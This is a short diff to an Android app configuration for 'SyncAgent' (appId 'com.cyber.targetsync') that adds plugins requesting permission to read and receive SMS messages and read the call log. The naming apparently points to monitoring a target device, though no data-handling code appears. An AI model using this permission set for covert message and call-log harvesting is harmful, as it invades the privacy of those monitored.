@@ -1,6 +1,19 @@
 {
   "appId": "com.cyber.targetsync",
   "appName": "SyncAgent",
-  "webDir": "target-app",
-  "bundledWebRuntime": false
+  "webDir": "www",
+  "bundledWebRuntime": false,
+  "plugins": {
+    "SMSReader": {
+      "androidPermissions": [
+        "android.permission.READ_SMS",
+        "android.permission.RECEIVE_SMS"
+      ]
+    },
+    "CallLog": {
+      "androidPermissions": [
+        "android.permission.READ_CALL_LOG"
+      ]
+    }
+  }
 }
